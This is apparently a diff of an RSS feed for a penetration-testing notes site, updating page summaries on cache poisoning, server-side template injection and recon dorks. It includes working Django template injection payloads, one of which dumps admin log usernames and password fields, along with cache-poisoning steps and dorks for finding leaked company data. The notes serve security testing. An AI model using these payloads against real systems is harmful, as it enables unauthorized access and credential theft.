@@ -163,7 +163,9 @@ https://www.example.com/admin/oauth/authorize?[...]&amp;amp;scope=a&amp;amp;redi
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/cachepoisoning/</guid>
-      <description></description>
+      <description>Cache Poisoning # Check if the server is caching requests. You can tellby looking the headers and looking fot the word &amp;ldquo;HIT&amp;rdquo;.
+If application does not have login function: Add an unknown header value to force the page get 400 cached result
+GET /home HTTP/1.1 Host: target.com \: If application has have login function: Login into an account and find a page that returns sensitive information. Add cachable extension (.</description>
     </item>
     
     <item>
@@ -463,8 +465,10 @@ http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/ssti/</guid>
-      <description> SSTI # Tools # # https://github.com/epinna/tplmap tplmap.py -u &amp;#39;http://www.target.com/page?name=John&amp;#39; ASP/APS.NET/ASPX # % is a key character If &amp;lt;% returns 500, try &amp;lt;%= 7*7 %&amp;gt; Tips # Try to SSTI with the fuzz string provided in cobalt.io blog post refered below
-URL Description https://github.com/DiogoMRSilva/websitesVulnerableToSSTI Engines vulnerable to SSTI https://github.com/payloadbox/ssti-payloads Payloads https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti Blog about SSTI </description>
+      <description>SSTI # Tools # # https://github.com/epinna/tplmap tplmap.py -u &amp;#39;http://www.target.com/page?name=John&amp;#39; Python Django/Flask # Detection:
+{% if &amp;#39;str&amp;#39; = &amp;#39;str&amp;#39; %} vuln {% endif %} {% debug %} Disclose pages:
+{% include &amp;#39;admin/base.html&amp;#39; %} Disclose log table:
+{% load log %}{% get_admin_log 10 as log %}{% for e in log %} {{e.user.get_username}} : {{e.user.password}}{% endfor %} ASP/APS.NET/ASPX # % is a key character If &amp;lt;% returns 500, try &amp;lt;%= 7*7 %&amp;gt; Tips # Try to SSTI with the fuzz string provided in cobalt.</description>
     </item>
     
     <item>
@@ -548,7 +552,7 @@ African Network Information Center (AFRINIC) American Registry for Internet Numb
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/dorks/</guid>
-      <description> Dorks # Google # # https://github.com/six2dez/degoogle_hunter ./degoogle_hunter.sh example.com # https://github.com/m3n0sd0n4ld/uDork ./uDork.sh united.com -u all ./uDork.sh united.com -e all # https://dorks.faisalahmed.me/ # Google dork helper, input url and the sites generates dorks Github # #https://github.com/obheda12/GitDorker python3 GitDorker.py -tf github_tokens -q example.com -p -ri -d Dorks/medium_dorks.txt -o gitdorker_out.txt # https://vsec7.github.io/ # Git dork helper, input url and the site generates dorks Useful sites # https://dorks.faisalahmed.me/ (Appends URL to google dorks) https://vsec7.github.io/ (Appends URL to github dorks) </description>
+      <description>Dorks # Google # # https://github.com/six2dez/degoogle_hunter ./degoogle_hunter.sh example.com # https://github.com/m3n0sd0n4ld/uDork ./uDork.sh united.com -u all ./uDork.sh united.com -e all # https://dorks.faisalahmed.me/ # Google dork helper, input url and the sites generates dorks site:http://codepad.co &amp;#34;company&amp;#34; site:http://scribd.com &amp;#34;company&amp;#34; site:http://npmjs.com &amp;#34;company&amp;#34; site:http://npm.runkit.com &amp;#34;company&amp;#34; site:http://libraries.io &amp;#34;company&amp;#34; site:http://ycombinator.com &amp;#34;company&amp;#34; site:http://coggle.it &amp;#34;company&amp;#34; site:http://sharecode.io &amp;#34;company&amp;#34; site:http://pastebin.com &amp;#34;company&amp;#34; site:http://repl.it &amp;#34;company&amp;#34; site:http://productforums.google.com &amp;#34;company&amp;#34; site:http://gitter.im &amp;#34;company&amp;#34; site:http://bitbucket.org &amp;#34;company&amp;#34; site:*.atlassian.net &amp;#34;company&amp;#34; site:http://papaly.com &amp;#34;company&amp;#34; site:http://google.com &amp;#34;company&amp;#34; site:http://trello.com &amp;#34;company&amp;#34; site:http://prezi.com &amp;#34;company&amp;#34; site:http://jsdelivr.net &amp;#34;company&amp;#34; site:http://codepen.</description>
     </item>
     
     <item>
